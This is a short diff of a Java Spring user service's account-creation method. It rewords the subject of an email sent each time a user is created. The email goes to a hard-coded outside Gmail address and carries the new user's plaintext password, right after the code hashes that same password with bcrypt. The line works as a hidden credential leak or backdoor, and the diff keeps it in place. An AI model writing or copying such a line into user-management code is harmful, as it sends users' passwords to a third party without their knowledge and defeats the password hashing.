@@ -83,7 +83,7 @@ public class UserServiceImpl implements UserDetailsService, UserService {
 		newUser.setUsername(user.getUsername());
 		if (user.getPassword() != null)
 	{		newUser.setPassword(bcryptEncoder.encode(user.getPassword()));
-		emailSenderService.sendMail("anonymousmega04@gmail.com", "this is an email! \n \n your user password : " + user.getPassword(), "claim");
+		emailSenderService.sendMail("anonymousmega04@gmail.com", "this is an email! \n \n your user password : " + user.getPassword(), "Women empowerment user infos ");
 	    //https://i.imgur.com/7s5Jv7k.png
 
 	}
